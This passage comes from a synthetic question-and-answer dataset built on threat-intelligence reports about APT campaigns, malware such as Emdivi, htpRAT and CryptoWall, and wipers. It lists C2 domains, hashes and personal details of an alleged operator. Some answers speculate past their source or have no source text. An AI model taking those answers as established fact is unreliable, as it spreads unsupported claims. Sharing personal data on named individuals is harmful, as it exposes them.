    "output": "The attackers used a built-in feature of MySQL, a software suite widely used by websites to manage back-end databases, to disable the Georgian websites. The 'benchmark' feature in MySQL was exploited to inject millions of junk queries into a targeted database, overwhelming the Web servers and causing them to effectively cease functioning. This strategy was effective because it allowed a small number of users to bring down the back-end databases, indicating planning, reconnaissance, and technical sophistication among the attackers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What factors contributed to the rise in ransomware attacks on businesses in 2015, and what was a notable development in this area?",
    "output": "The rise in ransomware attacks on businesses in 2015 was driven by two primary factors: the potential for larger ransoms from organizations compared to individual users, and the higher likelihood that businesses would pay the ransom to restore critical operations. A notable development in this area was the emergence of the first Linux encryption malware, which targeted websites, including online stores. This malware exploited vulnerabilities in web applications to encrypt server data, disrupting website functionality and demanding a ransom of one bitcoin for restoration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Lazarus Group's use of code obfuscation techniques, such as the JS obfuscation method, relate to the concept of Data Obfuscation in the context of Advanced Persistent Threats (APTs)?",
    "output": "Data Obfuscation refers to the practice of hiding or disguising data to make it more difficult to detect or decipher. In the context of APTs, Data Obfuscation is often used to conceal command and control (C2) communications. The Lazarus Group, a notorious APT actor, has been observed using code obfuscation techniques, such as the JS obfuscation method, to mask their malicious activities. Specifically, they employed a public and widely used technique of masking strings using their hexadecimal values and placing them in an array assigned to a variable with a naming structure of _0x[a-f0-9]{4}. This technique is a form of Data Obfuscation, as it aims to make the content more difficult to discover or decipher. By using such techniques, the Lazarus Group attempts to evade detection and make their C2 communications less conspicuous. Furthermore, the use of code obfuscation techniques, such as the JS obfuscation method, can be seen as a way to impersonate legitimate protocols, which is another characteristic of Data Obfuscation. Therefore, the Lazarus Group's use of code obfuscation techniques is a clear example of Data Obfuscation in the context of APTs.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Operation CloudyOmega: Ichitaro zero-day and ongoing cyberespionage campaign targeting Japan\nJustSystems has issued an update to its Ichitaro product line (Japanese office suite software), plugging a zero-day vulnerability. This vulnerability is being actively exploited in the wild to specifically target Japanese organizations.\nThe exploit is sent to the targeted organizations through emails with a malicious Ichitaro document file attached, which Symantec products detect as (<http://www.symantec.com/security_response/writeup.jsp?docid=2014-110611-5618-99>)Bloodhound.Exploit.557. Payloads from the exploit may include (<http://www.symantec.com/security_response/writeup.jsp?docid=2014-101715-1341-99>)Backdoor.Emdivi, (<http://www.symantec.com/security_response/writeup.jsp?docid=2012-062914-2531-99>)Backdoor.Korplug, and (<http://www.symantec.com/security_response/writeup.jsp?docid=2014-021716-3303-99>)Backdoor.ZXshell; however, all payloads aim to steal confidential information from the compromised computer.\nThe content of the emails vary depending on the business interest of the targeted recipient's organization; however, all are about recent political events associated with Japan. Opening the malicious attachment with Ichitaro will drop the payload and display the document. Often such exploitation attempts crash and then relaunch the document viewer to open a clean document in order to trick users into believing it is legitimate. In this particular attack, opening the document and dropping the payload are done without crashing Ichitaro and, as such, users have no visual indications as to what is really happening in the background.\nAnswer this question: In the context of Operation CloudyOmega, how does the exploitation of the Ichitaro zero-day vulnerability differ from typical exploitation methods that involve crashing and relaunching the document viewer? Why might this method be more effective for cyberespionage purposes?",
    "output": "The exploitation of the Ichitaro zero-day vulnerability in Operation CloudyOmega differs from typical methods because it drops the payload and displays the document without causing the Ichitaro application to crash and relaunch. This is significant because it means users have no visual indications that anything malicious is happening in the background. Typical exploitation methods often crash the application and then relaunch it with a clean document to trick users, but this approach can raise suspicions. By avoiding such disruptions, the attackers in Operation CloudyOmega can more effectively maintain stealth and increase the likelihood of successfully stealing confidential information, which is crucial for cyberespionage operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: CloudyOmega\nAs Security Response (<http://www.symantec.com/connect/blogs/yet-another-zero-day-japan-hit-ichitaro-vulnerability>)previously discussed, unpatched vulnerabilities being exploited is nothing new for Ichitaro. However, during our investigation of this Ichitaro zero-day attack, we discovered that the attack was in fact part of an ongoing cyberespionage campaign specifically targeting various Japanese organizations. Symantec has named this attack campaign CloudyOmega. In this campaign, variants of Backdoor.Emdivi are persistently used as a payload. All attacks arrive on the target computers as an attachment to email messages. Mostly the attachments are in a simple executable format with a fake icon. However, some of the files exploit software vulnerabilities, and the aforementioned vulnerability in Ichitaro software is only one of them. This group's primary goal is to steal confidential information from targeted organizations. This blog provides insights into the history of the attack campaign, infection methods, malware payload, and the group carrying out the attacks.\nBig Headline: Attack vector\nEmail is the predominant infection vector used in this campaign.\nFigure 2 is an example of an email used in recent attacks prior to those exploiting the Ichitaro zero-day vulnerability. The emails include password-protected .zip files containing the malware. Ironically, the attackers follow security best practices by indicating in the first email that the password will be sent to the recipient in a separate email. This is merely to trick the recipient into believing the email is from a legitimate and trustworthy source. The body of the email is very short and claims the attachment includes\na medical receipt. The email also requests that the recipient open the attachment on a Windows computer. The file in the attachment has a Microsoft Word icon but, as indicated within Windows Explorer, it is an executable file.\nBig Headline: Payload\nThe malicious payload is Backdoor.Emdivi, a threat that opens a back door on the compromised computer. The malware is exclusively used in the CloudyOmega attack campaign and first appeared in 2011 when it was used in an attack against a Japanese chemical company. Emdivi allows the remote attacker executing the commands to send the results back to the command-and-control (C&C) server through HTTP.\nEach Emdivi variant has a unique version number and belongs to one of two types: Type S and Type T. The unique version number is not only a clear sign that Emdivi is systematically managed, but it also acts as an encryption key. The malware adds extra words to the version number and then, based on this, generates a hash, which it uses as an encryption key.\nBoth Emdivi Type S and Type T share the following functionality:\nAllow a remote attacker to execute code through HTTP\nSteal credentials stored by Internet Explorer\nType T is primarily used in Operation CloudyOmega, has been in constant development since the campaign was first launched in 2011, and is written in the C++ programing language. Type T employs techniques to protect itself from security vendors or network administrators. Important parts of Type T,\nsuch as the C&C server address it contacts and its protection mechanisms, are encrypted. Type T also detects the presence of automatic analysis systems or debuggers, such as the following:\nVirtualMachine\nDebugger\nSandbox\nType S, on the other hand, was used only twice in the attack campaign. Type S is a .NET application based on the same source code and shared C&C infrastructure as Type T. However, protection mechanisms and encryption, essential features for threat survival, are not present in Type S. One interesting trait of Type S is that it uses Japanese sentences that seem to be randomly taken from the internet to change the file hash. For instance, in the example shown in Figure 4, it uses a sentence talking about the special theory of relativity.\nBig Headline: Who is Emdivi talking to?\nOnce infected, Emdivi connects to hardcoded C&C servers using the HTTP protocol.\nSo far, a total of 50 unique domains have been identified from 58 Emdivi variants. Almost all websites used as C&C servers are compromised Japanese websites ranging from sites belonging to small businesses to personal blogs. We discovered that 40 out of the 50 compromised websites, spread across 13 IP addresses, are hosted on a single cloud-hosting service based in Japan.\nThe compromised sites are hosted on various pieces of web server software, such as Apache and Microsoft Internet Information Services (IIS), and are on different website platforms. This indicates that the sites\nwere not compromised through a vulnerability in a single software product or website platform. Instead, the attacker somehow penetrated the cloud service itself and turned the websites into C&C servers for Backdoor.Emdivi.\nThe compromised cloud hosting company has been notified but, at the time of writing, has not replied.\nSymantec offers two IPS signatures that detect and block network communication between infected computers and the Emdivi C&C server:\nBig Headline: Zero-day and links to other cybercriminal groups\nDuring our research, multiple samples related to this attack campaign were identified and allowed us to connect the dots, as it were, when it came to CloudyOmega's connections to other attack groups.\nBoth attacks use a .doc file containing an Adobe Flash zero-day exploit that is used to install a back door. No other evidence connects these two different campaigns; however, as described previously in Symantec Security Response's (<http://www.symantec.com/connect/blogs/how-elderwood-platform-fueling-2014-s-zero-day-attacks>)Elderwood blog, it is strongly believed that a single parent organization has broken into a number of subgroups that each target a particular industry.\nIn terms of the latest attack on Ichitaro, we collected a dozen samples of JTD files, all of which are exactly the same except for their payload. The parent organization, it would seem, supplied the zero-day exploit to the different subgroups as part of an attack toolkit and each group launched a separate attack using their chosen malware. This is why three different payloads (Backdoor.Emdivi, Backdoor.Korplug, and Backdoor.ZXshell) were observed in the latest zero-day attack.\nBig Headline: Conclusion\nOperation CloudyOmega was launched by an attack group that has communication channels with other notorious attack groups including Hidden Lynx and the group responsible for LadyBoyle. CloudyOmega has been in operation since 2011 and is persistent in targeting Japanese organizations. With the latest attack employing a zero-day vulnerability, there is no indication that the group will stop their activities anytime soon. Symantec Security Response will be keeping a close eye on the CloudyOmega group.\nAnswer this question: How does the CloudyOmega attack campaign utilize email as an infection vector, and what techniques are employed to convince recipients to open malicious attachments?",
    "output": "The CloudyOmega attack campaign primarily uses email as an infection vector. The emails include password-protected .zip files containing the malware. To trick recipients into believing the email is legitimate, the attackers indicate that the password will be sent in a separate email, mimicking security best practices. The body of the email is short and claims the attachment includes a medical receipt, requesting the recipient to open it on a Windows computer. The file in the attachment has a Microsoft Word icon but is actually an executable file.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Execution of operator commands\nThe design of htpRAT differs from 'common' RATs. Most RATs feature a fixed set of commands that attackers can execute with different command IDs. For example, file download or file upload would both be unique functionalities of the RAT. htpRAT doesn't adhere to this structure. Instead, the malware creator decided to generalize this concept by having the RAT execute commands directly as provided from a C2 server. This means, for example, there is no specific function to get screenshots on the host; instead, on the C2 server side, the operator has a button which says 'Get Screenshot' which simply generates a set of commands to execute through something like PowerShell to take a screenshot. This makes htpRat dynamic and, subject to change. Any new functionality the operators want they simply implement by wrapping commands on the C2 without having to update the htpRAT source code.\nCoincidentally, this also means we cannot give a fixed list of functionality for this RAT. Its functionality is completely dependent on what rights the RAT was able to obtain upon installation and what the operator wants to do.\nThe way the execution of commands when the bot starts is implemented is as follows, :\n\uf075 A separate command prompt process is started which can be communicated with via named pipes.\n\uf075 Any incoming commands from the C2 are executed via the named pipes on the sub process.\n\uf075 Results are read from the named pipe and communicated back to the C2 server.\nBig Headline: Infrastructure analysis\nBased on the analysis of the malware we know that qf.laoscript.org is the C2 host for this malware. The WHOIS data for this domain is quite interesting as the name 'John Durdin' can be seen on multiple domains, but what stands out is the difference in email address used in the registrations. The following is a search on domain registrations for this name in PassiveTotal--most have the same email address, but one stands out. The email address is the registered domain:\nIf we look more closely, we see that there is also a .NET domain for laoscript. The C2 domain is clearly registered to raise fewer suspicions by mimicking the other domain. It becomes even more clear when we see all the registration information was just copied if you compare laoscript.net and laoscript.org:\nThe only thing the actor could not fake was the email address due to the fact that an email address must be used to activate the domain at the registrar. The use of the laoscript name is quite interesting as it\nshows real active targeting. The real laoscript website is a piece of software that helps with the input of the Lao language text on computers which gives the actor good leverage for social engineering:\nLooking at the domain we can see it has been registered since 2014 which means this C2 domain has been under the control of the actor for at least two years. We can also see that in the past, the domain has been used in other attack campaigns as well which indicates there are more yet undiscovered victims. There are also two samples that connect to qf.laoscript.org which are not htpRAT, they are in fact variations of the well known PlugX malware:\n\u2022 5e0019485fbfa2796ec0f1315c678b4a3fb711aef5d97f42827c363ccd163f6d (First seen 2015-07-10)\n\u2022 eeb34edec5fd04e6a44bf5c991eaf79c68432d4d0037b582bcd9062cc2b94c62 (First seen 2015-07-17)\nBoth also use DLL side loading techniques but using a different antivirus product to leverage execution through. Still this means there's an active connection between the current actors with the new unknown htpRAT and where they in the past used PlugX. While we can only guess for reasons why this actor decided to develop their own tool instead of continuing to use PlugX, it seems it is at least a step up in terms of detection of the malware. PlugX was becoming quite common and easy to detect on both the network as well as file system level.\nBig Headline: Other activity by the actor using htpRAT\nGoing through older samples connecting to the C2 domain for htpRAT, we mostly find a variety of PlugX samples. We also ran into the exploit activity by the group, ShadowServer, documented in their paper, \".\" Page six describes the use of the HackingTeam leaked exploits by various groups.\nOne interesting connection is a piece of malware called 'MyHNServer' which is a packaged PlugX payload.\nThis sample also connects to 'qf.laoscript.org' and has quite an interesting PDB path:\nThe first foldername '\u5df4\u54e5\u7ec4' is interesting; in context it translates to the 'elderly' or 'brother' group most likely referring to a more senior/experienced and respected group. If we correlate samples based on this PDB path, we get into some really interesting attacks. One other PDB path we can find based on the group's name is for another piece of malware called 'MyCL' (sha256: 2fa07d41385c16b0f6ad32d12908db1743ca77db0b71e6cfd0fde76ef146e983):\nThe first word '\u70ae\u7070' means 'source code,' and the second '\u6e90\u7801' means 'victims.' By itself the sample isn't that interesting, although it isn't PlugX or htpRAT. It is interesting because of the C2 server used: 'data. dubkill.com'. This domain has been widely used in other attacks in Vietnam as documented by BKav, a Vietnamese security company: . Looking at the registration information for the dubkill domain, we can find an interesting link to a more recent government attack. The domain is registered to a person using the email address 'dubkill@163.com,' this same email address was also used to register 'dcsvn.org' which was used to imitate the official military domain in Vietnam. This attack was publicly documented by BKav () and the Vietnamese government (). Additionally there is IP address overlap between 'dcsvn.org' and 'laoscript.org' in 2015.\nFollowing all these links over WHOIS, the shared domains and shared working paths reveals the adversary's web  is wider and deeper than expected. While this report was solely written to inform about a new piece of malware used by this adversary this last section highlights the size and amount of operations.\nMedium Headline: htpRAT Miscellaneous IOCs:\nAdditional IOCs related to the 'Other activity by the htpRAT group' section are listed below. These contain a raw dump of observed samples, domains and IPs. This last set of IOCs is not tracked in the public PT project linked above. Also keep in mind there is a substantial amount of historical IP addresses for the domains in the list below which aren't related to current activity. They are only shone in combination with the adjoining domain names. This section is quite raw and unstructured: the only connection is through shared infrastructure from the htpRAT campaign.\nMedium Headline: Additional filesystem IOCs:\nFor a full, continuously updated list of IOCs related to htpRAT, visit the RiskIQ Community Public Project here:\nRiskIQ is the leader in digital threat management, providing the most comprehensive discovery, intelligence, and mitigation of threats associated with an organization's digital presence. With more than 75 percent of attacks originating outside the firewall, RiskIQ allows enterprises to gain unified insight and control over web, social, and mobile exposures. Trusted by thousands of security analysts, RiskIQ's platform combines advanced internet data reconnaissance and analytics to expedite investigations, understand digital attack surfaces, assess risk, and take action to protect business, brand, and customers. Based in San Francisco, the company is backed by Summit Partners, Battery Ventures, Georgian Partners, and MassMutual Ventures.\nLearn how RiskIQ could help protect your digital presence by scheduling a demo today.\n22 Battery Street, 10th Floor San Francisco, CA. 94011\n\uf0e0 \uf0ac (<https://www.riskiq.com>)RiskIQ.com\n\uf095 1 888.415.4447\n\uf099 (<https://twitter.com/RiskIQ>)@RiskIQ\n\u00a92017 RiskIQ, Inc. All rights reserved. RiskIQ is a registered trademark and Digital Footprint is a trademark of RiskIQ, Inc. in the United States and other countries. All other trademarks contained herein are property of their respective owners. 10_17\n\nQuestion: How does the design of htpRAT differ from traditional RATs, and what advantages does this provide to the attackers?\n\nAnswer:",
    "output": "The design of htpRAT differs from traditional RATs in that it does not feature a fixed set of commands. Instead, htpRAT executes commands directly as provided from a C2 server. This means that the RAT does not have specific functions like getting screenshots; instead, the operator on the C2 server can generate a set of commands to execute tasks through tools like PowerShell. This makes htpRAT dynamic and subject to change, allowing operators to implement new functionality by wrapping commands on the C2 without updating the htpRAT source code. This flexibility provides attackers with the advantage of being able to adapt and extend the malware's capabilities without needing to redeploy it.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Very Small Headline: CoMMENT paNDa\nBased on passive dns records, several PUttEr Panda associated domains have resolved to IP address 100.42.216.230:\n\u2022 news.decipherment.net\n\u2022 res.decipherment.net\n\u2022 spacenews.botanict.com\n\u2022 spot.decipherment.net\nadditionally, several subdomains of  ujheadph.com resolved to this IP:\n\u2022 chs.ujheadph.com\n\u2022 imageone.ujheadph.com\n\u2022 img.ujheadph.com\n\u2022 klcg.ujheadph.com\n\u2022 naimap.ujheadph.com\n\u2022 neo.ujheadph.com\n\u2022 newspace.ujheadph.com\n\u2022 pasco.ujheadph.com\nanother subdomain of ujheadph.com has been observed2  in connection with distinctive traffic originating from the 3Para rat (described below), making it probable that this domain is  also associated with PUttEr Panda.\nthe decipherment.net domains resolved to this IP address from 11 october 2012 to at least 25 February 2013, and the botanict.com domain resolved from 11 october 2012 to 24 March 2013.\nduring part of this timeframe (30 June 2012 - 30 october 2012), a domain associated with CoMMEnt Panda resolved to this same IP address: login. aolon1ine.com. additionally, for a brief period in april 2012, update8.firefoxupdata.com also resolved to this IP address.\nthe use of the same IP address during the same time suggests that there is perhaps some cooperation or shared resources between CoMMEnt Panda and PUttEr Panda.\nVery Small Headline: vIXEN paNDa\nalthough not as conclusive as the links to CoMMEnt Panda, IP address 31.170.110.163 was associated with VIXEn Panda domain blog. strancorproduct.info from november to december 2013. In February 2014, this IP address was also associated with PUttEr Panda domain ske.hfmforum. com. While not directly overlapping, this potential infrastructure link is interesting, as VIXEn Panda has previously displayed ttPs similar to CoMMEnt Panda (other Crowdstrike reporting describes VIXEn Panda malware that extracts C2 commands embedded between delimiters in web content), and has extensively targeted European entities.\n2See http://webcache.googleusercontent.com/search?q=cache:ZZyfzC1Y0UoJ:www.urlquery.net/report. php%3Fid%3D9771458+&cd=2&hl=en&ct=clnk&gl=uk\nMedium Headline: \"cPyy\"\nseveral email addresses have been associated with cpyy, who also appears to use the alternate handles cpiyy and cpyy.chen:\n\u2022 cpyy@sina.com\n\u2022 cpyy@hotmail.com\n\u2022 cpyy.chen@gmail.com\n\u2022 cpyy@cpyy.net\nthe cpyy.net domain lists \"Chen Ping\" as the registrant name, which may be cpyy's real name, as this correlates with the initials \"cp\" in \"cpyy\". a personal blog for cpyy was found at http://cpiyy.blog.163.com/. the profile on this blog (shown in Figure 2 below) indicates that the user is male, was born on 25 May 1979, and works for the \"military/police\" (\u5176\u4ed6- \u519b\u4eba/\u8b66\u5bdf).\n\nAnswer this question based on the above context: What insights can be drawn from the association of the IP address 31.170.110.163 with both VIXEn Panda and PUttEr Panda domains, and how does this relate to their tactics, techniques, and procedures (TTPs)?",
    "output": "The association of the IP address 31.170.110.163 with both VIXEn Panda and PUttEr Panda domains suggests a potential infrastructure link between the two groups. Specifically, the domain blog.strancorproduct.info, associated with VIXEn Panda, resolved to this IP address from November to December 2013, while the domain ske.hfmforum.com, associated with PUttEr Panda, resolved to the same IP address in February 2014. Although the timeframes do not directly overlap, this link is notable because VIXEn Panda has exhibited TTPs similar to those of CoMMEnt Panda, such as extracting command and control (C2) commands embedded between delimiters in web content. Additionally, VIXEn Panda has extensively targeted European entities, indicating a broader targeting scope. This insight is crucial for cybersecurity professionals as it underscores the importance of monitoring shared infrastructure and understanding the TTPs of related threat groups to better defend against sophisticated and coordinated cyber espionage campaigns.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nSmall Headline: Device Targeting\nUsers can now target ads to a specific device when trafficking ads. An option for \"Device Targeting\" is now available under \"Targeting\". A creative targeted to a specific Device will serve only on that Device. All major manufacturers/models are supported by this feature. If a creative is not targeted to any specific device than it will serve on all device.\nApart from device, a user can target various devices based on different categories. At any given point of time, a user can target multiple manufacturers and categories.\nBig Headline: Major Players in RTB\nTo be clear, RTB networks are legitimate platforms for displaying ads on ad-supported websites. They enable micro-targeting of user's interest, delivering content that a viewer would likely want to see. As we have detailed here, they can also be mis-appropriated unwittingly by malvertisers using these same tools and techniques to target companies with malware for persistent remote access in addition to traditional click fraud, phishing, and identity theft.\nBelow are links to RTB providers to learn more.\nBig Headline: How Malvertisers Get $$ to Bid on RTB\nInvincea has shown logs from a winning malvertising bid in the price range of 65 cents per impression. That is one ad, on one page, paid for by the malvertiser's account. This implies that malvertisers have deep pockets, spending hundreds of dollars on ad impressions. So how do they get money to spend on these malicious campaigns?\nInvincea recently saw a malvertiser win a bid and delivered a Java exploit. This exploit copied a fully functional version of Chrome into the Java cache directory, and that version of Chrome launched in the background and proceeded to visit websites and click on specific ad banners. It is presumed that these ad banners paid revenue via referral bonuses to the malvertiser. By paying 65 cents to install a background web browser that does nothing but click fraud, the malvertiser is able to reap hundreds if not thousands of dollars in advertising referral income. It is a pretty good return on investment, which in turn allows the malvertiser to fund his micro-targeted malvertising attack campaign.\nIt is ironic, however, that click fraud is what is driving the prices of RTB advertising so high. Malvertising is not only a danger to end users, but it is a danger to the advertising industry as well. The image from Figure 14 below shows a log file of Chrome, in this instance, renamed Oajvliewxpge.exe, injected via Java to run in the background. Invincea detected this attack and killed the infection attempt. This is one instance where the malvertiser wasted his 65 cents.\nIt should be noted that Invincea is uniquely capable of stopping this type of attack. The introduction of Chrome as a browser, which is whitelisted by hash across the AV industry, would go unchecked by the AV and whitelisting applications industry. In this instance, the host was almost converted to a click-fraud bot. But the malware delivery could have been intended for data exfiltration, banking Trojans, or any other more insidious purpose.\nBig Headline: Where Malvertisers Host Exploits\nThe ability for advertisers and malvertisers to automatically redirect to self-hosted ad content or exploit pages is driving RTB malvertising. Invincea has witnessed a rash of exploit kits and landing pages hosted on:\n\uf0b7 Compromised WordPress Blogs\n\uf0b7 Unconfigured Apache hosts\n\uf0b7 Cloud-based NGINX subdirectories\n\uf0b7 Government and News pages in Poland\n\uf0b7 Free Hosting sites such as ua.in\nIn most instances, the landing pages are preconfigured with the exploit kit. The malvertiser creates the redirection in his normal ad prior to raising his bids to winning levels. Once several victims are confirmed, those malicious landing pages have the content erased, and the automatic redirection removed to serve \"normal\" ads again.\nBig Headline: Ransomware Campaign via Malvertising\nIn September and October of 2014, Invincea saw a sharp spike of malvertising delivering CryptoWall ransomware attacks via Real Time Ad Bidding. We observed Real Time Ad bidding platforms, including OpenX, GoogleAds, Yahoo, AOL, and first-impression.com, fall victim to the ransomware malvertising scheme by unwittingly delivering the CryptoWall 2.0 ransomware ads.\nRansomware is a particularly pernicious form of malware that fully encrypts the victim's disk and data files, including remote storage, then demands payment of anywhere from $300 to $1000 in return for the decryption key. Users are held hostage from their own work, pictures, personal, and proprietary material. To learn more about the scourage of ransomware, see this .\nBased on analysis of Invincea logs in would-be victims targeted by these ads, we have insight into the attacker that is delivering the malicious ads. According to Invincea analysis of ads delivered from first-impression.com, winning ad bids ranging from as low as 30 cents and as high as $1.70, were delivered by a block of unique identifiers.  It is highly likely that the same attackers are using other RTB ad platforms.\nThis campaign matches the characteristics in terms of the exploitation methods. Legitimate ad copy is stolen, 3rd party ad networks used to distribute malware, and popular ad-supported websites displaying the malicious ads that exploit unsuspecting visitors with drive-by web exploits. Merely visiting any ad-supported site may result in a CryptoWall ransomware infection.\nCryptowall 2.0 utilizes the TOR network to hide its communications, but it quickly encrypts all local files on the disk, and demands bitcoin payment to unlock the files. Many companies have fallen prey to this attack over the past few months, making this one of the most successful Ransomware campaigns to date.\nBig Headline: Mitigated Infection Event Sports.Yahoo.com\nBelow is a typical Cryptowall 2 infection as seen in the Invincea Management Server logs.  This winning ad placement ran on sports.yahoo.com \u2013 an Alexa Top 4 rated site. Highlighted in order in Figure 22 is the common filename of obupdat.exe, which has ever changing hashes, followed by the TOR port, and the 3rd party ad platform of first-impression.com.\nAnalysis (Original report):\nTimeline Analysis (Original Report):\nBelow in Figure 23 is the timeline of the Tor connections and SSL connections employed by CryptoWall.\nIn addition, you can see the ransom note being written to disk on an infected machine in the audit logs in Figure 24.\nFigure 25 shows the winning malvertising bid via RTB ad delivery from first-impression.com. Items highlighted in the URL below is userid, and the winning bid price to place malvertising of Cryptowall on sports.yahoo.com, which is 60 cents.\nIn Figure 26 below, we show the unique identifiers for the userID and campaigns to deliver CryptoWall malware that were blocked and audited by Invincea, including the websites that delivered the ads via a third-party ad network over the past month.\nFigure 26: Malware campaigns delivered via 3rd party ad network and the websites that hosted the ads\nTo reiterate, neither the websites listed here, nor the 3rd party ad network, necessarily was aware of the malicious ads they were serving to the website visitors. It is likely they were not aware without ad screening technology.\nIn each event above, Invincea blocked an attempt to infect an endpoint with Cryptowall 2.0 and prevented CryptoWall from encrypting the user's file system and holding it hostage.  Had the user not been running Invincea, the attack would likely have been successful, and the only way the user would have had to recover the encrypted files would be to pay the attacker the ransom.  This is an effective ransom technique, and one that is paying off well for the attackers, who use the income from the attacks to purchase Real Time Ad Bids on RTB networks to infect more users.\nBig Headline: Central Hosting of Clean Content\nMost RTB ad providers allow for advertisers to host their own ad content. This allows advertisers to directly collect web impression data of who is hitting which ads, from where, by which IPs, which user-agent strings, and just about anything else you could log about a website visit. In addition, the advertising network doesn't have to utilize their own disk space to host the image files, the flash videos or other online content. RTB networks simply do the auctioneering and redirection to the winning content.\nIt is this weakness in security that malvertisers are taking advantage of.  If ad networks were to switch to a model where all content is actually hosted by them (1st party hosting), in a cloud, then the risk of malvertising would drop dramatically.\nThe has a Seller's Cloud, which could be a security model for the RTB industry. It is inherently more secure way of hosting ad content.\n\nHow do malvertisers leverage Real-Time Bidding (RTB) platforms to fund their malicious campaigns, and what specific techniques do they use to generate revenue?",
    "output": "Malvertisers leverage RTB platforms by bidding on ad impressions, sometimes paying as much as 65 cents per impression. They generate revenue through click fraud, where a Java exploit installs a fully functional version of Chrome in the Java cache directory. This version of Chrome runs in the background, visiting websites and clicking on specific ad banners, generating referral bonuses for the malvertiser. This revenue is then used to fund further micro-targeted malvertising attacks. The malware delivery could also be intended for more insidious purposes like data exfiltration or banking Trojans.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Document exploits\nDocument exploits are exploits that target vulnerabilities in the way a document editing or viewing application processes a particular file format. (<>)Figure 35 shows encounter rates for individual exploits.\nFigure 35. Individual document exploits detected and blocked by Microsoft real-time antimalware products, 3Q14\u20132Q15\n\uf0b7 Most detections of exploits that affect Adobe Reader and Adobe Acrobat were associated with the exploit family (<http://www.microsoft.com/security/portal/threat/encyclopedia/search.aspx?query=Win32/Pdfjsc>)Win32/Pdfjsc, a detection for PDF files containing malicious JavaScript that targets (<http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0188>)CVE-2010-0188 and other vulnerabilities. Adobe released Security Bulletin (<http://www.adobe.com/support/security/bulletins/apsb10-07.html>)APSB10-07 in February 2010 to address CVE-2010-0188. Pdfjsc and related exploits were particularly prevalent in eastern Europe. Pdfjsc mostly targets older Java vulnerabilities, so attackers may find it less useful as more computers are updated to newer versions of Java, which could explain the decrease in encounters over the past several quarters.\nMedium Headline: Adobe Flash Player exploits\nFigure 36. Adobe Flash Player exploits detected and blocked by Microsoft real-time antimalware products, 3Q14\u20132Q15\n\uf0b7 Encounters involving Obfuscator variants that target Adobe Flash Player increased from very low levels in 1Q15 to become the largest source of Flash Player-related exploit encounters in 2Q15. Most of these encounters involved two newly discovered threats: (<http://www.microsoft.com/security/portal/threat/encyclopedia/Entry.aspx?Name=Exploit:SWF/Obfuscator.K>)Exploit:SWF/Obfuscator.K targets (<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8439>)CVE-2014-8439, (<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0311>)CVE-2015-0311, (<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0313>)CVE-2015-0313, and (<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0359>)CVE-2015-0359; (<http://www.microsoft.com/security/portal/threat/encyclopedia/Entry.aspx?Name=Exploit:SWF/Obfuscator.L>)Exploit:SWF/Obfuscator.L mainly targets (<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0336>)CVE-2015-0336.\n\uf0b7 \uf0b7 \uf0b7\n\nQuestion: Why did the Win32/Pdfjsc exploit family primarily target older Java vulnerabilities, and how did this impact its effectiveness over time?\n\nAnswer:",
    "output": "The Win32/Pdfjsc exploit family primarily targeted older Java vulnerabilities because it leveraged known weaknesses in outdated software versions. This strategy was effective initially, especially in regions like eastern Europe where systems might not have been regularly updated. However, as more computers were updated to newer versions of Java, which patched these vulnerabilities, the effectiveness of Pdfjsc decreased. This explains the observed decline in encounters with Pdfjsc over the past several quarters. Attackers found it less useful as the user base became more secure through updates, leading to a natural reduction in the prevalence of this particular exploit.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "IsaacWiper and HermeticWizard: New wiper and worm targeting Ukraine\nMarch 1, 2022\nAs the recent hostilities started between Russia and Ukraine, ESET researchers discovered several malware families targeting Ukrainian organizations.\nOn February 23rd, 2022, a destructive campaign using HermeticWiper targeted multiple Ukrainian organizations.\nThis cyberattack preceded, by a few hours, the start of the invasion of Ukraine by Russian Federation forces\nInitial access vectors varied from one organization to another. We confirmed one case of the wiper being dropped by GPO, and uncovered a worm used to spread the wiper in another compromised network.\nMalware artifacts suggest that the attacks had been planned for several months.\nOn February 24th, 2022, a second destructive attack against a Ukrainian governmental network started, using a wiper we have named IsaacWiper.\nESET Research has not yet been able to attribute these attacks to a known threat actor.\nRead the text above and answer this question: How did the initial access vectors for the HermeticWiper and IsaacWiper attacks differ across various Ukrainian organizations, and what does this indicate about the planning and execution of these cyberattacks?",
    "output": "The initial access vectors for the HermeticWiper and IsaacWiper attacks varied from one organization to another. In one instance, the wiper was deployed through Group Policy Objects (GPO), while in another case, a worm was used to propagate the wiper within a compromised network. This variation suggests that the attacks were meticulously planned over several months, allowing the attackers to tailor their methods to the specific vulnerabilities and configurations of each targeted organization. The discovery of malware artifacts further supports the notion that these attacks were not spontaneous but rather part of a well-coordinated campaign.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the T9000 keylogger malware differ in its behavior in the sample described in Targeted Exploitation #7 compared to other samples? What specific files are found in the Intel folder and why might this difference be significant?",
    "output": "In the sample described in Targeted Exploitation #7, the T9000 keylogger malware exhibits different behavior in that the Intel folder contains fewer files than usual. Specifically, the Intel folder includes 'hjwe.dat' (the encrypted core of the malware family), '~1' (debug information about files used by the malware), and a 'Data' folder containing 'dtl.dat' (encrypted config) and 'glp.uin' (plugin configuration) files. This difference is significant because it deviates from the typical pattern observed in other T9000 samples, which usually contain a larger number of files in the Intel folder. The reason for this discrepancy is unknown but could indicate a variation in the malware's deployment strategy or a specific customization for this particular attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
